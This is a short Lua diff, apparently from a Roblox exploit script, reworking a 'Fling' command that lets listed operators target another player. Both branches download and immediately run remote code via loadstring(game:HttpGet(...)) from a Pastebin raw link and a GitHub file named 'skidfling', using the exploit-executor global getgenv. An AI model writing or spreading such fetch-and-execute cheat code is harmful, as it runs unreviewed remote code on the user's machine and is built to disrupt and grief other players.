@@ -141,19 +141,22 @@ local function Bring(speaker, raw)
 	end
 end
 
+
 local function Fling(speaker, raw)
 	if not Ops[speaker.UserId] then return end
-	local targetRaw = Trim(raw:sub(5) or "")
-	if targetRaw ~= "" then 
-		print("df")
-		local targetPlayer = GetPlayer(targetRaw)
-		if targetPlayer then
-			getgenv().Target = targetPlayer
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/1shibainu/Kaboom/refs/heads/main/skidfling"))()
-		end
-	else
+	local targetRaw = Trim(raw:sub(7) or "")
+	if targetRaw == "" then 
 		print("dfj")
 		loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+		return
+	end
+
+	print("df")
+	local targetPlayer = GetPlayer(targetRaw)
+	if targetPlayer then
+		getgenv().Target = targetPlayer
+		print(targetPlayer)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/1shibainu/Kaboom/refs/heads/main/skidfling"))()
 	end
 end
 
